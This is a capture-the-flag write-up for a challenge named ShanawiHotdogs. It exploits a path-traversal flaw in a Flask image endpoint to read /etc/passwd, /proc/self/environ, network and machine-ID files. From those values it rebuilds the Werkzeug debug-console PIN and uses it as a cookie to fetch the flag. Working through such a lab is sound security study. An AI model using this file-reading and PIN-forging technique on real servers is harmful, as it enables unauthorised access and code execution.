---
layout: default
title: ShanawiHotdogs
---
In this challenge we can first detect the possible `LFI` at the endpoint `/img/<path>`:
```py
@app.route('/img/<path>')
def get_image(path: str):
    path = b64decode(path).decode()
    image_path = os.path.join('static/', path)
    try:
        with open(image_path, 'rb') as file:
            payload = base64.b64encode(file.read()).decode()
            return Response(payload, mimetype='text/plain')
    except Exception as e:
        return str(e), 500
```

For example, grabbing `/etc/passwd`:

![[Pasted image 20260308174114.png]]

I'm using the extension *Hackvertor* for BurpSuite, for easier encoding.

Then, at the endpoint `/flag` we can see it wants the secret `werkzueg` console pin:

```py
@app.route('/flag')
def flag():
    pin, _ = get_pin_and_cookie_name(app)
    secret_pin = request.cookies.get('secret_pin', '')
    if not (secret_pin and secret_pin == pin):
        return 'You didn\'t enter the right pin!', 403
```

Okay, based on [https://www.daehee.com/blog/werkzeug-console-pin-exploit/](https://www.daehee.com/blog/werkzeug-console-pin-exploit/) and also [https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/werkzeug.html](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/werkzeug.html), we can build the secret pin from zero.

The full code we'll use is the next script (this is the final version, after grabbing all the parameters):

```py
{{% include_relative ./cracker.py %}}
```

However, We'll need several parameters to find:
1. username
Let's get the `env`, by grabbing `/proc/self/environ`

![[Pasted image 20260308175314.png]]

and this is the decrypted data:

```bash
PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=ec115a0b2070
PORT=5050
LANG=C.UTF-8
GPG_KEY=7169605F62C751356D054A26A821E680E5FA6305
PYTHON_VERSION=3.12.12
PYTHON_SHA256=fb85a13414b028c49ba18bbd523c2d055a30b56b18b92ce454ea2c51edc656c4
PYTHONDONTWRITEBYTECODE=1
PYTHONUNBUFFERED=1
FLASK_APP=app.py
FLASK_ENV=development
FLASK_DEBUG=1
HOME=/home/coil
FLASK_RUN_FROM_CLI=true
WERKZEUG_SERVER_FD=3
WERKZEUG_RUN_MAIN=true
```

the username is probably `coil`, we can verify that also by using the endpoint `/whoami`.

2. modname

It is probably `flask.app` or `werkzeug.debug`, we'll take them both to the script.

3. appname

This is `Flask`, this is the application name

4. full path to `app.py`

After some navigating, I found the full path:
```bash
/usr/local/lib/python3.12/site-packages/flask/app.py
```

Here you can see this:

![[Pasted image 20260308180926.png]]

5. Mac address in decimal

First, we need to access `/proc/net/arp`, to find the device id, in our case `eth0`.

```bash
IP address       HW type     Flags       HW address            Mask     Device
172.19.0.1       0x1         0x2         0e:74:f4:a3:cb:68     *        eth0
172.19.0.14      0x1         0x2         46:e5:7e:fd:98:b5     *        eth0
```

Now, we fetch `/sys/class/net/eth0/address`, that gives us the Mac address.

![[Pasted image 20260308181459.png]]

```bash
86:80:ee:c7:ca:88
```

we need to transform it into decimal, we can use python to get that:

```py
>>> print(0x8680eec7ca88)
147888320006792
```

6. Machine ID

Taking the data from `/etc/machine-id`, or in our case where we are inside docker container, the data from `/proc/sys/kernel/random/boot_id` which is (I removed the `-`):
```bash
e90c95cfdecb4b06866f95ff2e7bc384
```

with the first line of `/proc/self/cgroup` post the last slash (`/`).

![[Pasted image 20260308181821.png]]

So, we don't take nothing from the `cgroup`.

That's it, I executed and got the pincode:
```
191-655-438
```

Now, we can try send request to `/flag`, with the header:
```
Cookie: secret_pin=191-655-438
```

![[Pasted image 20260308183258.png]]